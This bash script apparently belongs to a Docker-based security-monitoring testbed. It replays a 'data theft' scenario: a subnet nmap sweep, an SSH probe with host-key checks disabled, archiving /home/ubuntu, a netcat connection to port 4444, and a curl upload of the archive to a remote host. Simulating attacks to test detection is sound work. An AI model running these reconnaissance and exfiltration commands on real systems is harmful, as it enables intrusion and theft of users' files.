#!/bin/bash
# Manual, standalone version of run_attack.sh's scenario_a() (data theft,
# account ubuntu). Must run on the Docker host itself, not inside any
# container. Does NOT reset artifacts/isolation/indexer history first -
# do that yourself beforehand if needed (../run_attack.sh --reset, or see
# ../README.md's "手動解除隔離" section).
cd "$(dirname "${BASH_SOURCE[0]}")"
source ./_lib.sh

echo "=== Sub-scenario A (data theft, ubuntu) ==="
run_as ubuntu "whoami"
step_gap
run_as ubuntu "nmap -sn ${LINK_SUBNET}"
step_gap
run_as ubuntu "ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 ubuntu@${LAN_IP} exit" || true
step_gap
run_as ubuntu "tar czf /tmp/steal.tgz /home/ubuntu"
step_gap
run_as ubuntu "nc ${LAN_IP} 4444 </dev/null" || true
step_gap
run_as ubuntu "curl -s -T /tmp/steal.tgz http://${LAN_IP}:8000/" || true
echo "=== Sub-scenario A done ==="
